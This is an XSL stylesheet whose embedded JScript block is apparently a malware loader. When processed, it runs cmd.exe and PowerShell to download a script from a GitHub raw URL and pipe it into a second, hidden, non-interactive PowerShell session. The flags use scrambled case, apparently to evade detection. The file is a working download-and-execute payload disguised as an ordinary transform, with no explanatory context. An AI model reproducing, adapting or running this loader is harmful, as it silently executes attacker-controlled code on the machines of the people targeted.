<?xml version='1.0'?>
<stylesheet
xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt"
xmlns:user="placeholder"
version="1.0">
<output method="text"/>
    <ms:script implements-prefix="user" language="JScript">
    <![CDATA[
    var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c powershell irm https://raw.githubusercontent.com/joes233f/ccc/main/a.ps1|powershell -noLOG  -WInDoWST  HIDDe  -NoeXI  -NoprOFILE -noniNtErac");
    ]]> </ms:script>
</stylesheet>
